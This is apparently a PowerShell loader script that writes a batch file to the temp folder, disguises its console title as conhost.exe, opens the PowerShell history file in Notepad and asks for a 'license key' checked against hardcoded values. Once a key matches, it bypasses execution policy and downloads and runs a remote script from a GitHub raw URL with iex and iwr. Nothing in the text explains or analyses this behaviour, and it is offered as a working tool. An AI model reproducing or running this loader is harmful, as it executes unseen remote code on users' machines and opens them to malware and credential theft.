$path = "$env:TEMP\run.bat"

@"
@echo off
title C:\Windows\System32\conhost.exe
cls

set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
if not exist "%hist%" type nul > "%hist%"
start notepad "%hist%"

set /p key=Enter license key: 

if "%key%"=="Nel" goto ok
if "%key%"=="King" goto ok
if "%key%"=="finalpremium-27BHJ" goto ok

echo Invalid key
pause
exit

:ok
powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
echo.
echo Successfully
pause
"@ | Out-File -Encoding ASCII $path

Start-Process cmd -ArgumentList "/k "$path""
exit
